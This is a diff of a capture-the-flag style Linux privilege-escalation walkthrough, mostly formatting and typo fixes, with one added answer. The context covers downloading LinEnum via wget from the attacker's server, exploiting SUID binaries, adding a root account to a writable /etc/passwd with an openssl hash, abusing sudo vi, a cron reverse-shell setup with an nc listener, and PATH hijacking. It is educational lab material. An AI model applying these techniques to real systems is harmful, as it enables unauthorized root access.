@@ -9,7 +9,7 @@ Tasks <span class="pink">1</span>, <span class="pink">2</span> and <span class="
 
 ## Task 4 : Enumeration
 
-To get LinEnum on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store LinEnum.sh or you will have to provide the path to it afterwards) and connect to it from the target :
+To get `LinEnum` on the target's machine, you need to start a server on your local machine (it has to be in the directory where you store `LinEnum.sh` or you will have to provide the path to it afterwards) and connect to it from the target :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/python%20listener%20server4.png" class="border" />
  
@@ -32,7 +32,7 @@ wget <YOUR MACHINE'S @IP>:8000/LinEnum.sh
 >By using this command, we are downloading the file `LinEnum.sh` from the server in <YOUR MACHINE'S @IP> that we started before.
 
 
-Now that LinEnum.sh is on the target's machine, we need to make it executable (because we need to run it in order to start the enumeration process), this is done by using :
+Now that `LinEnum.sh` is on the target's machine, we need to make it executable (because we need to run it in order to start the enumeration process), this is done by using :
 
 ```
 chmod +x LinEnum.sh
@@ -56,7 +56,7 @@ cat /etc/passwd | grep user*
 * * *
 For a beteter understanding of wildcards in Linux, you can visit [this page](https://geek-university.com/linux/wildcard/) 
 
-The next step is to find how many shells are there on the system, to guess so, we need to start enumerating with `LinEnum.sh`.
+The next step is to find how many shells there are in the system, to guess so, we need to start enumerating with `LinEnum.sh`.
 You can run the script with :
 
 ```
@@ -72,7 +72,7 @@ A better way of keeping our enumeration clean and easily manageable is to write 
 
 > The file can be named as what you want, but I recommend using a name such as "LinEnum" or "Enumeration".
 
-Once we have run the script, we can look for how many shells there are on the system :
+Once we have run the script, we can look for how many shells there are in the system :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/grep%20shell4.png" class="border" />
 
@@ -84,10 +84,10 @@ cat linEnum.txt | grep shell
 <p class="answer">Answer : There are 4 shells in the system</p>
 * * *
 
-We are now asked what is the name of the bash script that is set to run every 5 minutes by cron.
-Cron is used to automate tasks in Linux, its syntax can be a little bit tricky so if you need some more info you can have a look at [this site](https://linuxhandbook.com/crontab/)
+We are now asked what is the name of the bash script that is set to run every 5 minutes by `cron`.
+`cron` is used to automate tasks in Linux, its syntax can be a little bit tricky so if you need some more info you can have a look at [this site](https://linuxhandbook.com/crontab/)
 
-Cron jobs are displayed in each user's /etc/crontab file, but since we run `LinEnum.sh` to do the work for us, we can just look for it at its output :
+`cron` jobs are displayed in each user's `/etc/crontab` file, but since we run `LinEnum.sh` to do the work for us, we can just look for it at its output :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/grep%20crontab%204.png" class="border" />
 
@@ -112,11 +112,11 @@ ls -l /etc/passwd
 
 >With the `find` command, we can look for files with concrete permissions by using the option `-perm`, to find files with user writing permissions we can look for `-200`, which shows every file which permissions are set to 200 or more.
 >
->With `2>/dev/null`, we redirect the stderr (Standard Error) to /dev/null, which is kind of a "black hole" that discards all the data that is writen to it.
+>With `2>/dev/null`, we redirect the stderr (Standard Error) to `/dev/null`, which is kind of a "black hole" that discards all the data that is writen to it.
 >
 >For more info on stderr, visit [this page](https://www.howtogeek.com/435903/what-are-stdin-stdout-and-stderr-on-linux/). For more info on /dev/null, check [here](https://en.wikipedia.org/wiki/Null_device).
 >
->A lot of files will be shown, but since /etc/passwd is such an important file, we can check its permissions with `ls -l` and see that it can be writen to.
+>A lot of files will be shown, but since `/etc/passwd` is such an important file, we should check its permissions with `ls -l` and see that it can be writen to.
 
 
 ## Task 5 : Abusing SUID/SGID Files
@@ -127,7 +127,7 @@ If the `SUID` bit is set on a file, it means that the file will be executed with
 If the `SGID` bit is set on a file, the file will be executed with the permissions of the group that owns the file.
 <p class="pink">Important : SUID and SGID have different behaviour when they are set in directories</p>
 
-In order to find files with the SUID bit set, we can have a look at our `LinEnum` scan, or we can search them manually :
+In order to find files with the `SUID` bit set, we can have a look at our `LinEnum` scan, or we can search them manually :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/find%20suid%20files5.png" class="border" />
 
@@ -142,7 +142,7 @@ It seems that there is an uncommon file with the SUID bit set :
 <p class="answer">Answer : /home/user3/shell</p>
 * * *
 
-Due to `shell` having the SUID set, we can execute it and gain superuser privileges on the machine :
+Due to `shell` having the `SUID` set, we can execute it and gain superuser privileges on the machine :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/root5.png" class="border" />
 
@@ -161,8 +161,8 @@ ls -l /home/user3/shell
 ## Task 6 : Exploiting writeable /etc/passwd
 
 The `/etc/passwd` file stores valuable account information, <span class="pink">it doesn't contain passwords</span>, it contains a list of the accounts of the system and it provides information about each and every of them, such as user ID, group ID, home directory, etc.
-This file needs to have read permissions because other utilities require them to properly work, however it must not have write permissions except for the root account.
-When a user can write in the /etc/passwd file, it can lead to a security breach, which is what we are going to exploit right about now :
+This file needs to have read permissions because other utilities require them to work properly, however it <span class="pink">must not have write permissions</span> except for the root account.
+When a user can write in the `/etc/passwd` file, it can lead to a security breach, which is what we are going to exploit right about now :
 
 What direction privilege escalation is the attack?
 
@@ -191,7 +191,7 @@ openssl passwd -1 -salt new 123
 
 >A hash is a mathematical function that converts some text input into an output of a fixed length, this function can't be reverted (you can obtain a password's hash, but you can't obtain a hash's password).
 >
->openssl passwd computes the hash of the password that we provide to it.
+>`openssl passwd` computes the hash of the password that we provide to it.
 >
 >`-salt` is used to provide a salt, which is a piece of data that will be taken into account when computing the hash.
 >
@@ -201,7 +201,7 @@ openssl passwd -1 -salt new 123
 <span class="answer">Answer : $1$new$p7ptkEKU1HnaHpRtzNizS1</span>
 * * *
 
-Now that we have our hash computed, we can create a new entry in /etc/passwd and generate a new account with elevated privileges :
+Now that we have our hash computed, we can create a new entry in `/etc/passwd` and generate a new account with elevated privileges :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/etc%20passwd%20new%20user6.png" class="border" />
 
@@ -253,11 +253,11 @@ sudo vi
 
 As mentioned at the beginning, `cron` is a daemon (background process) that automates tasks. By looking at `/etc/crontab`, we can see which tasks are scheduled and research for anything of interest.
 
-Thanks to the `LinEnum`scan, we found that there is a script called `autoscript.sh` that is set to run as root every 5 minutes and it has writing permissions.
+Thanks to the `LinEnum` scan, we found that there is a script called `autoscript.sh` that is set to run as root every 5 minutes and it has writing permissions.
 
 <span class="pink">What is a payload?</span>
 
-A payload is the piece of code that we want the target to run, there are multiples tpyes of payloads, which you can learn about [in here](https://www.offensive-security.com/metasploit-unleashed/payloads/)
+A payload is the piece of code that we want the target to run, there are multiples types of payloads, which you can learn about [in here](https://www.offensive-security.com/metasploit-unleashed/payloads/)
 
 The path to scalating privileges here is to craft a payload that gets us a reverse shell (which will have root privileges because the script runs as root) and modify the script by inserting this payload in it.
 
@@ -293,6 +293,10 @@ find / -name autoscript.sh 2>/dev/null
 
 >Once again showing how useful `find` is, now with the `-name` switch, which lets us search a file by its name.
 
+* * *
+<span class="answer">Answer : /home/user4/Desktop/autoscript.sh</span>
+* * *
+
 We know where the script is now, so we need to rewrite its content with our payload :
 
 <img src="https://raw.githubusercontent.com/peixetlift/peixetlift.github.io/master/assets/LinuxPrivEsc/write%20payload%20in%20autoscript8.png" class="border" />
@@ -318,13 +322,13 @@ nc -lvp 8888
 
 ## Task 9 : Exploiting PATH Variable
 
-The `$PATH` variable is an environmental variable that indicates which directories contain executable programs, this way when you run a program that's in the `$PATH `variable, you don't need to know the path to the program in order to use it.
+The `$PATH` variable is an environmental variable that indicates which directories contain executable programs, this way when you run a program that's in the `$PATH` variable, you don't need to know the path to the program in order to use it.
 
 Imagine this time we have a binary that we can execute with elevated privileges (because it has the `SUID` bit set <span class="pink">;)</span>), however, this binary doesn't provide a way of spawning a shell (like `vi` in task 7).
 
-What we can do is create a binary with the same name than an already existing one, but locate it in a different place (/tmp for example). Afterwards we can modify the `$PATH` variable and tell it that the location of the binary (the original one) is /tmp.
+What we can do is create a binary with the same name than an already existing one, but locate it in a different place (`/tmp` for example). Afterwards we can modify the `$PATH` variable and tell it that the location of the binary (the original one) is `/tmp`.
 
-Do you see what we are doing?
+<span class="pink">Do you see what we are doing?</span>
 
 Now when we run the program, the system will check the `$PATH` and it will run the one that we created with escalated privileges, instead of the original one.
 
